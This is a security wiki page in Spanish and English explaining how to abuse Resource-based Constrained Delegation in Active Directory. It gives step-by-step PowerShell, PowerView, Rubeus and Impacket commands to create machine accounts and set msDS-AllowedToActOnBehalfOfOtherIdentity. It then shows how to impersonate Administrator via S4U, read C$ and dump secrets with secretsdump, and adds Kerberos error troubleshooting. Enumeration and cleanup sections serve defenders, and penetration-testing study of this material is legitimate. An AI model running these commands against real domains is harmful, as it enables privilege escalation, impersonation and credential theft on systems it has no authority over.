# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Conceptos básicos de Resource-based Constrained Delegation

This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.

Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (In the other forms of Delegation you needed domain admin privs).

### New Concepts

Back in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\
The reality is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** (have a SPN) but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.

However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work**.

### Estructura del ataque

> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.

Supongamos que el atacante ya tiene **privilegios equivalentes de escritura sobre el equipo víctima**.

1. The attacker **compromises** an account that has a **SPN** or **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until 10 Computer objects (**_MachineAccountQuota_**) and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).
3. The attacker uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged access to Service B**.
1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
4. The attacker can **pass-the-ticket** and **suplantar** the user to gain **access to the victim ServiceB**.

To check the _**MachineAccountQuota**_ of the domain you can use:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Creación de un objeto de equipo

Puedes crear un objeto de equipo dentro del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuración de Resource-based Constrained Delegation

**Usando el módulo activedirectory de PowerShell**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Uso de powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando un S4U attack completo (Windows/Rubeus)

Primero, creamos el nuevo objeto Computer con la password `123456`, así que necesitamos el hash de esa password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Esto imprimirá los hashes RC4 y AES para esa cuenta.\ Ahora, el attack se puede realizar:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puedes generar más tickets para más servicios simplemente pidiéndolo una vez usando el parámetro `/altservice` de Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Tenga en cuenta que los usuarios tienen un atributo llamado "**Cannot be delegated**". Si un usuario tiene este atributo en True, no podrás hacerte pasar por él. Esta propiedad puede verse dentro de bloodhound.

### Herramientas en Linux: RBCD de extremo a extremo con Impacket (2024+)

Si operas desde Linux, puedes realizar la cadena completa de RBCD usando las herramientas oficiales de Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- Si LDAP signing/LDAPS está habilitado, use `impacket-rbcd -use-ldaps ...`.
- Prefiera claves AES; muchos dominios modernos restringen RC4. Impacket y Rubeus soportan flujos solo con AES.
- Impacket puede reescribir el `sname` ("AnySPN") para algunas herramientas, pero obtenga el SPN correcto siempre que sea posible (p. ej., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Acceso

La última línea de comandos realizará el **ataque S4U completo y inyectará el TGS** desde Administrator al host víctima en **memoria**.\
En este ejemplo se solicitó un TGS para el **CIFS** servicio de Administrator, por lo que podrá acceder a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes service tickets

Aprende sobre los [**available service tickets here**](silver-ticket.md#available-services).

## Enumeración, auditoría y limpieza

### Enumerar equipos con RBCD configurado

PowerShell (decodificando la SD para resolver SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (leer o vaciar con un solo comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Limpieza / restablecimiento de RBCD

- PowerShell (eliminar el atributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Errores de Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que kerberos está configurado para no usar DES o RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o simplemente suminístrale los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora del equipo actual es diferente a la del DC y kerberos no está funcionando correctamente.
- **`preauth_failed`**: Esto significa que el nombre de usuario + hashes proporcionados no funcionan para iniciar sesión. Puede que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Esto puede significar:
  - El usuario al que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
  - El servicio solicitado no existe (si pides un ticket para winrm pero winrm no está en ejecución)
  - La cuenta fakecomputer creada ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolvérselos.
  - Estás abusando del KCD clásico; recuerda que RBCD funciona con tickets S4U2Self no forwardable, mientras que KCD requiere forwardable.

## Notas, relays y alternativas

- También puedes escribir el SD de RBCD a través de AD Web Services (ADWS) si LDAP está filtrado. See:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Las cadenas de Kerberos relay frecuentemente terminan en RBCD para lograr SYSTEM local en un único paso. Ver ejemplos prácticos de extremo a extremo:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si LDAP signing/channel binding están **deshabilitados** y puedes crear una cuenta de máquina, herramientas como **KrbRelayUp** pueden realizar un relay de una autenticación Kerberos coaccionada hacia LDAP, establecer `msDS-AllowedToActOnBehalfOfOtherIdentity` para tu cuenta de máquina en el objeto de equipo objetivo, y suplantar inmediatamente a **Administrator** vía S4U desde fuera del host.

## Referencias

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
